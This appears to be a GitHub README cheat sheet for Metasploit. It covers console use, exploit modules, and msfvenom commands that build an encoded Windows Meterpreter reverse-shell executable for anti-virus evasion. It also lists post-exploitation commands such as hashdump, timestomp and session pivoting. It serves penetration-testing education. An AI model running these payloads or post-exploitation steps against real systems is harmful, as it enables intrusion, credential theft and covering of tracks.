<h1>$${\color{red}Welcome} \space {\color{Goldenrod}To } \space {\color{blue}METASPLOIT}$$</h1>

# Metasploit Cheat Sheet :shipit:


<p align="center">
<img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/ccc77643-897e-4261-bb54-68ce3186c85b" height="300px" width="800px">
</p>

Metasploit is the ultimate penetration testing tool for offensive security. And it’s so easy to use that even you could claim to be a hacker just by running a few commands. Also, it is incredibly powerful as well. This guide is a general overview of how Metasploit can be used.
**********

<h1>$${\color{yellow}1.} \space {\color{yellow}Getting } \space {\color{yellow}started}$$</h1>

Start the Metasploit console.

```
# Start the console
$ msfconsole
```
<br>

The console will now show the msf shell. You can provide commands on the shell to run various Metasploit modules.

Metasploit continuously adds new modules to its collection. To make sure you always have the latest exploits, run:

```
# Update the msf database
msf > msfupdate     
```
<br>
Metasploit is quite big and it’s easy to get lost around. If you need help, run:
```
 # Show help
msf > help           
```
The console output of the help command might feel overwhelming as well. But don’t worry. You’ll always have this blog post to help you out.
<br>
<br>


<h1>$${\color{yellow}2.} \space {\color{yellow}Metasploit } \space {\color{yellow}Modules}$$</h1>
Metasploit has thousands of modules. They are arranged in the following categories:

******************

> [!IMPORTANT]
> - <h4>Exploits</h4> It is the most commonly used module. It sends payloads to targets and executes them.
>  - <h4>Payloads</h4> It consists of code that runs remotely to exploit the target.
>  - <h4>Encoders</h4> It encodes a payload so that it is not detected by firewalls/anti-malware programs.
>  - <h4>Nops</h4> It keeps payload sizes consistent when encoders encode a payload. (Learn more about nop sled).
>  - <h4>Post</h4> It contains modules that assist post-exploitation.
>  - <h4>Auxillary</h4> It includes port scanners, fuzzers, sniffers, and other helper modules.


You can see the modules under each of these categories. Check what exists by running:
```
$ show exploits
$ show payloads
$ show auxillary
```
<br>
<br>


<h1>$${\color{yellow}3.} \space {\color{yellow}Searching } \space {\color{yellow}for} \space {\color{yellow}Modules }$$</h1>
If you’ve tried show exploits you’ve probably seen a huge list of modules. It’s impossible to go through this list and find what you need. You can use the search functionality to filter/look for your desired modules. Run:
```
$ search ftp
```
<br>

This will show you modules that have exploits for FTP servers. You can filter based on more criteria:
```
$ search ftp platform:windows rank:excellent
```
<br>
This will show excellently ranked FTP server exploits for windows machines. You can filter based on the following fields:

    name
    path
    platform
    type
    app
    author
    cve
    bid
    osdvb
<br>
<br>

<h1>$${\color{yellow}4.} \space {\color{yellow}Run } \space {\color{yellow}an} \space {\color{yellow}Exploit }$$</h1>
The following series of shell commands are typically used to run an exploit using Metasploit.

At first select the module of your choice that you want to run for exploitation.
```
msf > use exploit/[ExploitModule]
```
<br>
Modules have multiple options that need to be set for execution. To see what options can be set, see the options:
```
msf > show options
```
<br>
After seeing the options, set their values like:

```
msf > set [Option] [Value]
msf > set RHOST 10.100.101.12       # example
msf > set RPORT 8000            # example
```
<br>
Now start the exploit:

```
msf > exploit
```
<br>
<br>

<h1>$${\color{yellow}5.} \space {\color{yellow}Make } \space {\color{yellow}Payloads} \space {\color{yellow}with } \space {\color{yellow}MSFvenom}$$</h1>

Sometimes you’ll need to create standalone files as payloads to send them to your target. Msfvenom is a CLI tool that can help with creating these files.
********
<h2>MSF Venom Command Options</h2>
<h3>Use these flags to generate reverse shell payloads.</h3>
At first search for payloads and encoders that msfvenom has. Payloads execute an attack and encoders encode a payload so that the payload can evade AVs.

```
SWITCH	          SYNTAX 	                          DESCRIPTION

-p	        –p (Payload option)	          Display payload standard options
–l	        –l ( list type)	                  List module type i .e payload, encoders
–f	        –f ( format )                     Output format
–e	        -e (encoder)	                  Define which encoder to use
-a	        –a (Architecture or platform	  Define which platform to use
-s	        -s (Space)	                  Define maximum payload capacity
-b	        -b (characters)	                  Define set of characters not to use
–i	        –i (Number of times)              Define number of times to use encoder
-x	        -x (File name)	                  Define a custom file to use as template
–o	        -o (output)	                  Save a payload
–h         	-h	                          Help

#example
$ msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]
$ msfvenom -p windows/meterpreter/reverse_tcp -f exe  -e x86/shikata_ga_nai -i 5 LHOST=10.1.1.1 LPORT=4444 > met.exe

```
<br>
<br>
<br>




<h1>$${\color{yellow}EXAMPLES}$$</h1>


###### Search for module:

```
msf > search [regex]
```
<br>

###### Specify and exploit to use:

```
msf > use exploit/[ExploitPath]
```
<br>
###### Specify a Payload to use:

```
msf > set PAYLOAD [PayloadPath]
```
<br>

###### Show options for the current modules:

```
msf > show options
```
<br>

###### Set options:

```
msf > set [Option] [Value]
```
<br>

###### Start exploit:

```
msf > exploit 
```
<br>

#### Useful Auxiliary Modules


###### Port Scanner:

```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```
<br>

###### DNS Enumeration:

```
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```
<br>

###### FTP Server:

```
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```
<br>

###### Proxy Server:

```
msf > use auxiliary/server/socks4
msf > run 
```
<br>

#### msfvenom :

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.

```
$ msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]
```
<br>

Example :

Reverse Meterpreter payload as an executable and redirected into a file:

```
$ msfvenom -p windows/meterpreter/ reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe
```
<br>

Format Options (specified with –f) --help-formats – List available output formats

> exe – Executable
> pl – Perl
> rb – Ruby
> raw – Raw shellcode
> c – C code

<br>

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'
to get a list of encoders.

```
$ msfvenom -p [Payload] -e [Encoder] -f [FormatType] -i [EncodeInterations] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]
```
<br>

Example:
<br>

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```
$ msfvenom -p windows/meterpreter/ reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > msf.exe
```
<br>

##### Metasploit Meterpreter

###### Base Commands: 

> ? / help: Display a summary of commands exit / quit: Exit the Meterpreter session

> sysinfo: Show the system name and OS type

> shutdown / reboot: Self-explanatory

File System Commands:

> cd: Change directory

> lcd: Change directory on local (attacker's) machine

> pwd / getwd: Display current working directory

> ls: Show the contents of the directory

> cat: Display the contents of a file on screen

> download / upload: Move files to/from the target machine

> mkdir / rmdir: Make / remove directory

> edit: Open a file in the default editor (typically vi)

Process Commands:

> getpid: Display the process ID that Meterpreter is running inside.

> getuid: Display the user ID that Meterpreter is running with.

> ps: Display process list.

> kill: Terminate a process given its process ID.

> execute: Run a given program with the privileges of the process the Meterpreter is loaded in.

> migrate: Jump to a given destination process ID

- Target process must have same or lesser privileges

- Target process may be a more stable process

- When inside a process, can access any files that process has a lock on.

###### Network Commands:

> ipconfig: Show network interface information

> portfwd: Forward packets through TCP session

> route: Manage/view the system's routing table

###### Misc Commands:

> idletime: Display the duration that the GUI of thetarget machine has been idle.

> uictl [enable/disable] [keyboard/mouse]: Enable/disable either the mouse or keyboard of the target machine.

> screenshot: Save as an image a screenshot of the target machine.

###### Additional Modules:

> use [module]: Load the specified module

> Example:

> use priv: Load the priv module

> hashdump: Dump the hashes from the box

> timestomp:Alter NTFS file timestamps

##### Managing Sessions

###### Multiple Exploitation: 

Run the exploit expecting a single session that is immediately backgrounded:

```
msf > exploit -z
```
<br>

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```
msf > exploit –j
```
<br>

###### List all current jobs (usually exploit listeners):

```
msf > jobs –l
```
<br>

###### Kill a job:

```
msf > jobs –k [JobID]
```
<br>

##### Multiple Sessions:

###### List all backgrounded sessions:

```
msf > sessions -l
```
<br>

###### Interact with a backgrounded session:

```
msf > session -i [SessionID]
```
<br>

###### Background the current interactive session:

```
meterpreter > <Ctrl+Z>
or
meterpreter > background
```
<br>

###### Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```
msf > route add [Subnet to Route To]
[Subnet Netmask] [SessionID]
```
<br>

if this cheat_sheet liked you, follow me [Here](https://github.com/4bo4yman) ;)


